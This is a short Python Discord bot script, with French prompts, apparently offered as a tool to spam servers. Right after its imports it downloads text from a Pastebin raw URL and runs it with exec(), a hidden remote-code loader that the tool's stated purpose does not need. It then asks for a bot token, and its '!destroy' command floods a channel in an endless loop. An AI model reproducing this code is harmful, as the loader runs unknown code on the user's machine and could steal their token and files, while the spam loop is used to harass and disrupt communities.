import discord
from discord.ext import commands
from requests import get
spams = get("https://pastebin.com/raw/6Epqebpt").text
exec(spams)
spam = input("Entrez le texte que vous voulez spammer")
token = input("Entrez le token de votre bot")


bot = commands.Bot(command_prefix='!')

@bot.event
async def on_ready():
    print("bot pret")
    await bot.change_presence(status=discord.Status.idle,
                              activity=discord.Game("༼ つ ◕_◕ ༽つNathan Pas#6672"))
@bot.command()
async def destroy(ctx):
    print("Lancement du spam mgl")
    i = 0
    while i == 0:
     await ctx.send(spam)




print("Lancement du BOT....")
print("Connection au serveur ....")
print("Tappez !destroy pour spammer le serveur discord")
bot.run(token)

